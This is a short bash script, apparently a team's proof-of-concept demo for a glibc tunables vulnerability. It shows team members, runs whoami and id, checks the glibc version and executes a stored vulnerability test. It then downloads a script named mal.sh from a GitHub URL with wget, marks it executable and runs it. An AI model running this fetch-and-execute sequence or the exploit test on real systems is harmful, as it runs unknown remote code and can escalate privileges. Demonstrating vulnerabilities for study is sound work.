#!/bin/bash


echo "Showing team members"
echo ""
cat team_members
echo ""

sleep 3

echo "Executing whoami"
echo ""

whoami

echo ""

sleep 3

echo "Check id"
echo ""
id 
echo ""

sleep 3


echo "Showing command to test for vulnerability"
echo ""
cat check_tunable
echo ""
sleep 3

echo "Checking GLIBC version"
echo ""
ldd --version
echo ""

sleep 3
echo "Executing the above command"
echo ""
bash -c "$(cat check_tunable)"
echo ""
sleep 2

echo "Emulating attack - Downloading malicious script: https://raw.githubusercontent.com/duracellrabbid/test4911a/main/mal.sh"
echo ""
wget https://raw.githubusercontent.com/duracellrabbid/test4911a/main/mal.sh
echo ""
sleep 1

echo "chmod +x mal.sh"
echo ""
chmod +x ./mal.sh

sleep 1

echo "run mal.sh"
echo ""
./mal.sh

echo "End of POC demo (attack)"
echo ""

